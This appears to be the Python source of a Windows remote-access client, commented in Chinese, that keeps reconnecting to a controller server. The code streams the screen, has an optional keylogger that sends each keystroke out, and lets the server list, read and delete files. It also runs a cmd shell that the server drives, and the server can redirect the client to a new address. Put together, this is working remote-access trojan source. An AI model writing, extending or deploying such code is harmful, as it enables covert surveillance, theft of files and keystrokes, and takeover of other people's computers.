import json
import random
import _ctypes
import win32api
import win32con
import threading
from PIL import Image
from time import time
from io import BytesIO
from typing import Callable, Optional
from os import walk, remove
from pynput import keyboard
from msvcrt import get_osfhandle
from os.path import isfile, abspath
from base64 import b64encode, b64decode
from subprocess import Popen, PIPE, STDOUT
from _winapi import PeekNamedPipe, ReadFile
from dxcampil import create as create_camera

from libs.packets import *
from libs.action import *

# 固定设置项
ERROR_DEBUG = True  # 启用已查看错误信息


class Default:
    """设置默认值, 并将键名称作为配置文件的名称"""

    HOST = "127.0.0.1"  # 服务器地址
    PORT = 10616  # 服务器端口
    UUID = hex(int.from_bytes(random.randbytes(8), "big"))[2:]  # 客户端默认UUID
    FILE_BLOCK_SIZE = 1024 * 100  # 文件块大小
    RECONNECT_TIME = 2  # 重连间隔时间
    CONNECT_TIMEOUT = 2  # 连接超时时间
    HOST_CHANGED = None  # 地址被服务端改变后，该值为[old_host, old_port]
    TIMEOUT_ADD = False  # 连接失败后是否增加重试间隔
    TIMEOUT_ADD_MULTIPLIER = 1.5  # 每次增加的时间倍率
    RECORD_KEY = False  # 启用按键记录


class Config:
    """配置文件 加载, 调用, 保存 器"""
    raw_config = {}

    def __init__(self, config_path: str = "config.json"):
        self.config_path = abspath(config_path)
        self.load_config()
        print(self.raw_config)

    def load_config(self):
        config_data = self.load_file_config()
        for attr_name in dir(Default):
            if not attr_name.startswith("__"):
                key_name = attr_name.lower()
                config_data[key_name] = config_data.get(key_name, getattr(Default, attr_name))
        self.raw_config = config_data
        self.save_config()

    def load_file_config(self) -> dict:
        config_data = {}
        if isfile(self.config_path):
            try:
                with open(self.config_path, "r") as f:
                    config_data = json.load(f)
            except OSError as e:
                print(f"Error loading config: {e}")
        return config_data

    def save_config(self):
        config_path = abspath("config.json")
        try:
            with open(config_path, "w") as f:
                json.dump(self.raw_config, f, indent=4)
        except OSError as e:
            print(f"Error saving config: {e}")

    def __getattr__(self, name: str):
        raw_config: dict = object.__getattribute__(self, "raw_config")
        if name in raw_config.keys():
            return raw_config[name]
        return object.__getattribute__(self, name)

    def __setattr__(self, name: str, value: Any):
        raw_config: dict = object.__getattribute__(self, "raw_config")
        if name in raw_config.keys():
            raw_config[name] = value
        object.__setattr__(self, name, value)


def random_hex(length: int) -> str:
    return hex(int.from_bytes(random.randbytes(length), "big"))[2:]


class ClientStopped(BaseException):
    pass


class ClientRestart(BaseException):
    pass


class TimerLoop:
    def __init__(self, interval: float, checker: Callable[[], bool], callback: Callable[[], None]):
        self.interval = interval
        self.checker = checker
        self.callback = callback
        self.ran = False
        self.running = False
        self.timer = None
        self.lock = threading.Lock()

    def start(self):
        with self.lock:
            if not self.running:
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()
                self.running = True

    def checking(self):
        with self.lock:
            if self.checker():
                if not self.ran:
                    self.callback()
                    self.ran = True
            else:
                self.ran = False
            if self.running:
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()

    def pause(self, pause: bool = True):
        with self.lock:
            if pause and self.running:
                self.timer.cancel()
                self.running = False
            elif not pause and not self.running:
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()
                self.running = True

    def stop(self):
        with self.lock:
            self.timer.cancel()
            self.running = False


class ActionManager:
    """实时在一个线程里按不同时间间隔运行不同的函数"""

    def __init__(self):
        self.actions: dict[str, tuple[TheAction, TimerLoop]] = {}

    def add_action(self, action: TheAction) -> str:
        """添加一个定时任务"""
        print(action.build_packet())
        uuid = random_hex(8)
        timer_loop = TimerLoop(action.check_inv, action.check, action.execute)
        timer_loop.start()
        self.actions[uuid] = (action, timer_loop)
        return uuid

    def stop2clear(self):
        """停止所有定时任务并清空"""
        for _, timer in self.actions.values():
            timer.stop()
        self.actions.clear()


class Client:
    def __init__(self, config: Config) -> None:
        self.config = config
        self.host = config.host
        self.port = config.port
        self.uuid = config.uuid
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.mouse_key_map = {
            "left": (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
            "middle": (win32con.MOUSEEVENTF_MIDDLEDOWN, win32con.MOUSEEVENTF_MIDDLEUP),
            "right": (win32con.MOUSEEVENTF_RIGHTDOWN, win32con.MOUSEEVENTF_RIGHTUP),
        }
        self.log_stack = {}
        self.__connected = False
        self.threads: list[Thread] = []

        # 屏幕传输相关
        self.sending_screen = False  # 是否发送屏幕
        self.screen_fps = 10  # 发送屏幕帧率
        self.shell_stop_flag = False  # 是否停止shell
        self.screen_format: str = ScreenFormat.JPEG  # 屏幕传输格式
        self.screen_quality = 80  # 使用JPEG格式时的传输质量
        self.pre_scaled = True  # 是否预缩放
        self.screen_size: tuple[int, int] = (860, 540)  # 预缩放提供的大小
        self.camera = create_camera()  # 截图所用相机
        self.key_listener = None
        self.shell_thread_running = False
        # noinspection PyTypeChecker
        self.shell: Popen = None

        self.packet_manager = PacketManager(self.connected)
        self.action_manager = ActionManager()
        print("客户端初始化完成")

    def log(self, *values: object):
        text = " ".join(map(str, values))
        self.log_stack[time()] = text
        print(text)

    def log_send_thread(self):
        while self.connected:
            for i in range(10):
                try:
                    min_time = min(self.log_stack.keys())
                    text = self.log_stack.pop(min_time)
                    packet_data = {
                        "type": "log",
                        "level": "info",
                        "text": text,
                        "time": time(),
                    }
                    self.send_packet(packet_data)
                except (KeyError, ValueError):
                    break
            sleep(0.1)

    def start(self) -> None:
        print("启动客户端")
        print("开始尝试连接至服务器")
        self.connect_until()
        self.log("成功连接至服务器!")
        self.sock.sendall(int(self.uuid, 16).to_bytes(8, "big"))
        self.shell_thread = start_and_return(self.shell_output_thread)
        self.threads.append(self.shell_thread)
        self.threads.append(start_and_return(self.log_send_thread))
        self.threads.append(start_and_return(self.packet_send_thread))
        self.threads.append(start_and_return(self.connection_init))
        self.threads.append(start_and_return(self.screen_send_thread))

        while self.connected:
            try:
                length, packet = self.recv_packet()
            except ConnectionError:
                self.connected = False
                break
            if packet is None:
                print("\r没有接收到数据包", end="")
                sleep(0.001)
                continue
            if packet["type"] != PING:
                print("接收到数据包:", packet_str(packet))
            if not self.parse_packet(packet):
                raise ClientStopped
        if self.config.record_key:
            self.key_listener.stop()
        print("停止")
        for thread in self.threads:
            thread.join()

    def connection_init(self):
        packets = [
            {"type": HOST_NAME, "name": socket.gethostname()},
            self.get_screen_packet(),
        ]
        for packet in packets:
            if packet:
                self.send_packet(packet)

    def get_screen_packet(self) -> Optional[Packet]:
        cost = perf_counter()
        try:
            screen = self.camera.grab()
        except _ctypes.COMError:
            print("相机错误")
            del self.camera
            self.camera = create_camera()
            return self.get_screen_packet()
        if screen is None:
            return screen
        cost2 = perf_counter()

        if self.pre_scaled:
            scale = max(
                screen.size[0] / self.screen_size[0],
                screen.size[1] / self.screen_size[1],
            )
            new_width = int(screen.size[0] / scale)
            new_height = int(screen.size[1] / scale)
            screen = screen.resize((new_width, new_height), Image.BOX)
        cost3 = perf_counter()
        fmt = self.screen_format[:]
        if fmt == ScreenFormat.JPEG:
            image_io = BytesIO()
            screen.save(image_io, format="JPEG", quality=self.screen_quality)
        elif fmt == ScreenFormat.PNG:
            image_io = BytesIO()
            screen.save(image_io, format="PNG")
        elif fmt == ScreenFormat.RAW:
            image_io = BytesIO()
            image_io.write(screen.tobytes())
        else:
            self.screen_format = ScreenFormat.JPEG
            return self.get_screen_packet()
        cost4 = perf_counter()
        image_bytes = image_io.getvalue()
        image_text = b64encode(image_bytes).decode("utf-8")
        packet = {
            "type": SCREEN,
            "size": screen.size,
            "format": fmt,
            "pre_scale": self.pre_scaled,
            "data": image_text,
        }
        # print(f"Cost: main->{ms(cost)} ms, grab->{ms(cost, cost2)} ms, scale->{ms(cost2, cost3)} ms, encode->{ms(cost3, cost4)} ms")
        return packet

    def screen_send_thread(self):
        last_send = perf_counter()
        while self.connected:
            if self.sending_screen and perf_counter() - last_send > 1 / self.screen_fps:
                last_send = perf_counter()
                packet = self.get_screen_packet()
                if packet is None:
                    continue
                self.send_packet(packet, True)

    def run_infinitely(self) -> bool:
        """需要退出时返回False"""
        while True:
            # noinspection PyBroadException
            try:
                if ERROR_DEBUG:
                    self.start()
                    continue
                try:
                    self.start()
                except Exception:
                    print("遇到未捕获的错误: 重启客户端")
                    break
            except KeyboardInterrupt:
                print("运行被用户终止")
                self.connected = False
                return False

    # noinspection PyUnresolvedReferences
    def parse_packet(self, packet: Packet) -> bool:
        """处理数据包，当需要退出时返回False"""
        if packet["type"] == SET_MOUSE_POS:
            win32api.SetCursorPos((packet["x"], packet["y"]))
        elif packet["type"] == SET_MOUSE_BUTTON:
            mouse_flag = self.mouse_key_map[packet["button"]][packet["state"]]
            win32api.mouse_event(packet["x"], packet["y"], 0, mouse_flag)

        elif packet["type"] == SET_SCREEN_FORMAT:
            self.screen_format = packet["format"]
        elif packet["type"] == SET_SCREEN_FPS:
            self.screen_fps = packet["fps"]
        elif packet["type"] == SET_SCREEN_SIZE:
            self.screen_size = packet["size"]
        elif packet["type"] == SET_PRE_SCALE:
            self.pre_scaled = packet["enable"]
        elif packet["type"] == SET_SCREEN_QUALITY:
            self.screen_quality = packet["quality"]
        elif packet["type"] == SET_SCREEN_SEND:
            self.sending_screen = packet["enable"]
        elif packet["type"] == GET_SCREEN:
            restore = False
            if not self.pre_scaled:
                restore = True
                self.pre_scaled = True
                self.screen_size = packet["size"]
            screen_packet = self.get_screen_packet()
            if restore:
                self.pre_scaled = False
            if screen_packet is not None:
                self.send_packet(screen_packet)

        elif packet["type"] == REQ_LIST_DIR:
            packet = self.get_files_packet(packet["path"])
            self.send_packet(packet)
        elif packet["type"] == FILE_VIEW:
            start_and_return(self.file_view_thread, (packet,))
        elif packet["type"] == FILE_DELETE:
            remove(packet["path"])
        elif packet["type"] == SHELL_INIT:
            self.restore_shell()
        elif packet["type"] == SHELL_INPUT:
            try:
                self.shell.stdin.write(b64decode(packet["text"]))
                self.shell.stdin.flush()
            except OSError:
                self.send_packet({"type": SHELL_BROKEN})
        elif packet["type"] == PING:
            self.send_packet({"type": "pong", "timer": packet["timer"]}, priority=Priority.HIGHEST)
        elif packet["type"] == STATE_INFO:
            self.sending_screen = packet["video_mode"]
            self.screen_fps = packet["monitor_fps"]
            self.screen_quality = packet["video_quality"]
        elif packet["type"] == ACTION_ADD:
            self.action_manager.add_action(TheAction.from_packet(packet))
        elif packet["type"] == CLIENT_RESTART:
            raise ClientRestart
        elif packet["type"] == CHANGE_ADDRESS:
            self.config.host_changed = [self.config.host, self.config.port].copy()
            self.config.host = packet["host"]
            self.config.port = packet["port"]
            self.config.save_config()
        elif packet["type"] == CHANGE_CONFIG:
            setattr(self.config, packet["key"], packet["value"])
        elif packet["type"] == REQ_CONFIG:
            self.send_packet({"type": CONFIG_RESULT, "config": self.config.raw_config})
        return True

    def file_view_thread(self, packet: Packet):
        file_block = self.config.file_block
        path = packet["path"]
        data_max_size = packet["data_max_size"]

        error_packet = {"type": FILE_VIEW_ERROR, "path": path, "error": "未知错误"}
        try:
            with open(path, "rb") as file:
                data = file.read(data_max_size)
        except FileNotFoundError:
            error_packet["error"] = "文件不存在"
            self.send_packet(error_packet)
            return
        except PermissionError:
            error_packet["error"] = "权限不足"
            self.send_packet(error_packet)
            return
        except OSError:
            self.send_packet(error_packet)
            return

        cookie = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
        packet = {"type": FILE_VIEW_CREATE, "path": path, "cookie": cookie}
        self.send_packet(packet)
        for block in [data[i : i + file_block] for i in range(0, len(data), file_block)]:
            packet = {
                "type": FILE_VIEW_DATA,
                "path": path,
                "data": b64encode(block).decode("utf-8"),
                "cookie": cookie,
            }
            self.send_packet(packet, priority=Priority.NORMAL)
        packet = {"type": FILE_VIEW_OVER, "path": path, "cookie": cookie}
        self.send_packet(packet, priority=Priority.LOWER)

    def shell_output_thread(self):
        self.shell_thread_running = True
        print("终端输出线程启动")
        try:
            while self.connected and (not self.shell_stop_flag):
                try:
                    output = self.get_output()
                    if output:
                        packet = {"type": SHELL_OUTPUT, "output": output}
                        self.send_packet(packet, priority=Priority.NORMAL)
                except BrokenPipeError:
                    self.send_packet({"type": SHELL_BROKEN})
                    break
                except OSError:
                    break
        except Exception as e:
            print(e)
        print("终端输出线程停止")
        self.shell_thread_running = False

    def get_output(self) -> str:
        # 读取输出
        output = ""
        handle = get_osfhandle(self.shell.stdout.fileno())
        avail_count, _ = PeekNamedPipe(handle, 0)
        if avail_count > 0:
            output, _ = ReadFile(handle, avail_count)
            output = output.decode("cp936", "ignore")

        if bool(output):
            return output
        else:
            return ""

    def connect_until(self):
        """重复连接直到连接成功"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_changed: list[str, int] | None = self.config.host_changed
        reconnect_time = self.config.reconnect_time
        while not self.connected:
            if self.try_connect():
                break
            if host_changed is not None:
                self.config.host = host_changed[0]
                self.config.port = host_changed[1]
                self.config.host_changed = False
                self.config.save_config()
            self.scroll_sleep(reconnect_time, "连接失败, 等待{}秒后重连: {}s")
            if self.config.timeout_add:
                reconnect_time *= self.config.timeout_add_multiplier
            reconnect_time = int(reconnect_time)
            if reconnect_time > 60:
                reconnect_time = 60
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def on_key_press(self, key):
        start_and_return(self._on_key_press, (key,))

    def _on_key_press(self, key):
        if isinstance(key, keyboard.Key):
            s = key.name
            if key == keyboard.Key.space:
                s = " "
        elif isinstance(key, keyboard.KeyCode):
            if key.char is not None:
                s = key.char
            else:
                try:
                    s = chr(key.vk - 48)
                except ValueError:
                    s = "Error"
        else:
            return
        packet = {"type": KEY_EVENT, "key": s}
        self.send_packet(packet)

    @staticmethod
    def get_files_packet(path: str) -> Packet:
        walk_obj = walk(path)
        root, dirs, files = next(walk_obj)
        packet = {"type": DIR_LIST_RESULT, "path": path, "dirs": dirs, "files": files}
        return packet

    @staticmethod
    def scroll_sleep(waits: float, text: str):
        timer = time()
        while timer + waits > time():
            sleep(0.1)
            print("\r" + text.format(waits, round(time() - timer, 1)), end="")
        print("\r" + text.format(waits, waits) + "   ")

    def init_var(self):
        self.sending_screen = False  # 是否发送屏幕
        self.screen_fps = 15  # 发送屏幕帧率
        self.shell_stop_flag = False  # 是否停止shell
        self.screen_format: str = ScreenFormat.JPEG  # 屏幕传输格式
        self.screen_quality = 80  # 使用JPEG格式时的传输质量
        self.pre_scaled = True  # 是否预缩放
        self.screen_size: tuple[int, int] = (960, 540)  # 预缩放提供的大小
        self.key_listener = keyboard.Listener(on_press=self.on_key_press)
        self.action_manager.stop2clear()
        self.shell_thread_running = False
        if getattr(self, "shell", None):
            self.shell.terminate()
        self.shell = Popen(
            ["cmd"],
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
            shell=True,
            universal_newlines=False,
        )

    def restore_shell(self):
        if getattr(self, "shell", None):
            self.shell.terminate()
            self.shell_stop_flag = True
            self.shell_thread.join()
            self.shell_stop_flag = False
        self.shell = Popen(
            ["cmd"],
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
            shell=True,
            universal_newlines=False,
        )
        if not self.shell_thread_running:
            self.shell_thread = start_and_return(self.shell_output_thread)

    def try_connect(self) -> bool:
        try:
            print("尝试连接至服务器")
            self.sock.settimeout(self.config.connect_timeout)
            self.sock.connect((self.host, self.port))
            self.packet_manager.init_stack()
            self.init_var()
            self.sock.settimeout(1)
            self.packet_manager.set_socket(self.sock)
            if self.config.record_key:
                self.key_listener.start()
            self.connected = True
            return True
        except ConnectionError as e:
            print("连接时发生错误:", e)
            self.connected = False
            return False
        except TimeoutError:
            print("连接超时")
            self.connected = False
            return False

    def packet_send_thread(self):
        self.packet_manager.packet_send_thread()

    def send_packet(
        self,
        packet: Packet,
        loss_enable: bool = False,
        priority: int = Priority.HIGHER,
    ) -> None:
        if packet["type"] != SCREEN and packet["type"] != PONG:
            print("发送数据包:", packet_str(packet))
        self.packet_manager.send_packet(packet, loss_enable, priority)

    def recv_packet(self) -> tuple[int, None] | tuple[int, Packet]:
        return self.packet_manager.recv_packet()

    def stop(self):
        print("停止客户端...")
        self.sock.close()
        if self.shell:
            self.shell.terminate()
        self.connected = False
        try:
            del self.camera
        except OSError:
            pass

    @property
    def connected(self):
        return self.__connected

    @connected.setter
    def connected(self, value: bool):
        self.__connected = value
        self.packet_manager.connected = value


if __name__ == "__main__":
    while True:
        try:
            client.stop()
            del client
        except NameError:
            pass

        config = Config()
        client = Client(config)

        try:
            ret = client.run_infinitely()
            if ret == False:
                break
        except ClientStopped:
            print("客户端被服务端停止")
            break
        except ClientRestart:
            pass
